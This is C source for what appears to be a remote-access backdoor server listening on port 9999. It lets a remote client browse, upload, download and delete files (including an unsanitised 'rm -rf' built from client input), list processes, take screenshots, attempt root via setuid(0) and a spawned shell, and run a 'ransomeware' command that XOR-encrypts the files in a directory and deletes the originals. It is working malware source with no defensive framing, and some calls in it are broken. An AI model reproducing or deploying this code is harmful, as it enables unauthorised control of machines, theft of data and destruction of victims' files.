#include <fcntl.h>
#include <netinet/in.h>
#include <pwd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/sendfile.h>
#include <sys/socket.h>
#include <sys/stat.h>

#define BUFSIZE 2048

void error_handling(char *message);
char *fileMode(const struct stat *fileInfo);
void append(char *str, char c);

int main(int argc, char **argv) {

    int serv_sock;
    int clnt_sock;
    int clnt_addr_size;
    int filehandle;
    int line_count = 0;
    int size, f_size, i, c;
    int PORT = 9999;

    char buf[100];
    char command[10];
    char filename[BUFSIZE];
    char enc_file[BUFSIZE];

    FILE *fp;
    FILE *fd;
    FILE *p_file = NULL;

    struct stat obj;
    struct stat fileInfo;
    struct passwd *userInfo;
    struct sockaddr_in serv_addr;
    struct sockaddr_in clnt_addr;

    serv_sock = socket(PF_INET, SOCK_STREAM, 0);
    if (serv_sock == -1) {
        error_handling("socket() error");
    }

    memset(&serv_addr, 0, sizeof(serv_addr));
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_addr.s_addr = htonl(INADDR_ANY);
    serv_addr.sin_port = htons(PORT);

    if (bind(serv_sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) ==
        -1) {
        // system("fuser -k -n tcp 9999");
        error_handling("bind() error");
    }

    if (listen(serv_sock, 5) == -1)
        error_handling("listen() error");

    clnt_addr_size = sizeof(clnt_addr);

    clnt_sock =
        accept(serv_sock, (struct sockaddr *)&clnt_addr, &clnt_addr_size);

    if (clnt_sock == -1)
        error_handling("accept() error");

    // command
    while (1) {
        recv(clnt_sock, buf, 100, 0);
        sscanf(buf, "%s", command);
        if (!strcmp(command, "cd")) { // cd
            if (chdir(buf + 3) == 0)
                c = 1;
            else
                c = 0;
            send(clnt_sock, &c, sizeof(int), 0);
        }

        else if (!strcmp(command, "ls")) { // ls
            system("ls | grep -v temp_ls.txt > temp_ls.txt");
            stat("temp_ls.txt", &obj);
            size = obj.st_size;
            send(clnt_sock, &size, sizeof(int), 0);
            filehandle = open("temp_ls.txt", O_RDONLY);
            sendfile(clnt_sock, filehandle, NULL, size);
            system("rm temp_ls.txt");
        }

        else if (!strcmp(command, "pwd")) { // pwd
            system("pwd > temp_pwd.txt");
            stat("temp_pwd.txt", &obj);
            size = obj.st_size;
            send(clnt_sock, &size, sizeof(int), 0);
            filehandle = open("temp_pwd.txt", 0644);
            sendfile(clnt_sock, filehandle, NULL, size);
            system("rm temp_pwd.txt");
        }

        else if (!strcmp(command, "rm")) { // rm
            sscanf(buf, "%s%s", filename, filename);
            char *rm = malloc(sizeof(char) * BUFSIZE);
            strcpy(rm, "rm -rf ");
            strcat(rm, filename);
            system(rm);
            free(rm);
        }

        else if (!strcmp(command, "ps")) { // ps
            system("ps -au | awk '{print $2 "
                   " $11}'> temp_ps.txt");
            stat("temp_ps.txt", &obj);
            size = obj.st_size;
            send(clnt_sock, &size, sizeof(int), 0);
            filehandle = open("temp_ps.txt", O_RDONLY);
            sendfile(clnt_sock, filehandle, NULL, size);
            system("rm temp_ps.txt");
        }

        else if (!strcmp(command, "getinfo")) { // getinfo
            sscanf(buf, "%s%s", filename, filename);
            if (stat(filename, &fileInfo) == -1) {
                continue;
            }
            stat(filename, &obj);
            filehandle = open(filename, O_RDONLY);
            size = obj.st_size;
            if (filehandle == -1) {
                size = 0;
            }
            send(clnt_sock, &size, sizeof(int), 0);
            if (size) {
                userInfo = getpwuid(fileInfo.st_uid);
                FILE *file = fopen("fileinfo.txt", "wt");
                fprintf(file, "%s %s\n", "File name or path:", filename);
                fprintf(file, "%s %ld\n", "File size:", fileInfo.st_size);
                fprintf(file, "%s\n", fileMode(&fileInfo));
                fprintf(file, "%s %s\n", "Owner name:", userInfo->pw_name);
                fclose(file);
                stat("fileinfo.txt", &obj);
                filehandle = open("fileinfo.txt", O_RDONLY);
                size = obj.st_size;
                if (filehandle == -1) {
                    size = 0;
                }
                send(clnt_sock, &size, sizeof(int), 0);
                if (size) {
                    sendfile(clnt_sock, filehandle, NULL, size);
                }
            }
        }

        else if (!strcmp(command, "download")) { // download
            sscanf(buf, "%s%s", filename, filename);
            stat(filename, &obj);
            filehandle = open(filename, O_RDONLY);
            size = obj.st_size;
            if (filehandle == -1) {
                size = 0;
            }
            send(clnt_sock, &size, sizeof(int), 0);
            if (size) {
                sendfile(clnt_sock, filehandle, NULL, size);
            }
        }

        else if (!strcmp(command, "upload")) { // upload
            int c = 0, len;
            char *f;
            sscanf(buf + strlen(command), "%s", filename);
            recv(clnt_sock, &size, sizeof(int), 0);

            while (1) {
                filehandle = open(filename, O_CREAT | O_EXCL | O_WRONLY, 0666);
                if (filehandle == -1) {
                    sprintf(filename + strlen(filename), "_1");
                } else
                    break;
            }
            f = malloc(size);
            recv(clnt_sock, f, size, 0);
            c = write(filehandle, f, size);
            close(filehandle);
            send(clnt_sock, &c, sizeof(int), 0);
        }

        else if (!strcmp(command, "id")) { // id
            system("id > temp_id.txt");
            stat("temp_id.txt", &obj);
            size = obj.st_size;
            send(clnt_sock, &size, sizeof(int), 0);
            filehandle = open("temp_id.txt", 0644);
            sendfile(clnt_sock, filehandle, NULL, size);
            system("rm temp_id.txt");
        }

        else if (!strcmp(command, "quit")) { // quit
            i = 1;
            send(clnt_sock, &i, sizeof(int), 0);
            exit(0);
        }

        else if (!strcmp(command, "ransomeware")) { // ransomeware
            system("ls -p -I*.out | grep -v '/$' | grep -v temp_ls.txt > "
                   "temp_ls.txt");
            p_file = fopen("temp_ls.txt", "rt");
            if (p_file != NULL) {
                while (fgets(enc_file, 128, p_file) != NULL) {
                    if (enc_file[strlen(enc_file) - 1] == '\n')
                        enc_file[strlen(enc_file) - 1] = '\0';
                    int ch;

                    fp = fopen(enc_file, "r+b");

                    char *s1 = malloc(sizeof(char) * BUFSIZE);
                    char *s2 = malloc(sizeof(char) * BUFSIZE);
                    strcpy(s1, enc_file);
                    strcat(s1, ".enc");

                    fd = fopen(s1, "w+b");

                    while ((ch = fgetc(fp)) != EOF) {
                        int original = ch;
                        int cryptograph = 0;

                        int key = 0x394A38C9;

                        cryptograph = original ^ key;
                        ch = cryptograph;

                        fputc(ch, fd);
                    }
                    strcpy(s2, "rm -rf ");
                    strcat(s2, enc_file);
                    system(s2);

                    fclose(fd);
                    fclose(fp);
                    free(s1);
                    free(s2);
                }

                fclose(p_file);
            }
            system("rm temp_ls.txt");

        } else if (!strcmp(command, "getroot")) { // getroot
            setuid(0);
            getuid(0);
            system("/bin/bash &");
            strcpy(buf, "Get root permission!!!");
            send(clnt_sock, buf, 100, 0);
        }

        else if (!strcmp(command, "screenshot")) { // getroot
            system("scrot -q 20 screenshot.jpg &");
        }
    }

    //
    close(clnt_sock);
    return 0;
}

void append(char *str, char c) {

    char *p = str;
    while (*p != '\0')
        p++;
    *p = c;
    *(p + 1) = '\0';
}

char *fileMode(const struct stat *fileInfo) {

    char *mode;
    mode = malloc(100);
    strcpy(mode, "File permission: ");
    char r = 'r';
    char w = 'w';
    char x = 'x';
    char z = '-';
    // User
    if (S_IRUSR & fileInfo->st_mode) {
        append(mode, r);
    } else {
        append(mode, z);
    }
    if (S_IWUSR & fileInfo->st_mode) {
        append(mode, w);
    } else {
        append(mode, z);
    }
    if (S_IXUSR & fileInfo->st_mode) {
        append(mode, x);
    } else {
        append(mode, z);
    }
    // Group
    if (S_IRGRP & fileInfo->st_mode) {
        append(mode, r);
    } else {
        append(mode, z);
    }
    if (S_IWGRP & fileInfo->st_mode) {
        append(mode, w);
    } else {
        append(mode, z);
    }
    if (S_IXGRP & fileInfo->st_mode) {
        append(mode, x);
    } else {
        append(mode, z);
    }
    // Others
    if (S_IROTH & fileInfo->st_mode) {
        append(mode, r);
    } else {
        append(mode, z);
    }
    if (S_IWOTH & fileInfo->st_mode) {
        append(mode, w);
    } else {
        append(mode, z);
    }
    if (S_IXOTH & fileInfo->st_mode) {
        append(mode, x);
    } else {
        append(mode, z);
    }
    return mode;
    free(mode);
}

void error_handling(char *message) {
    fputs(message, stderr);
    fputc('\n', stderr);
    exit(1);
}
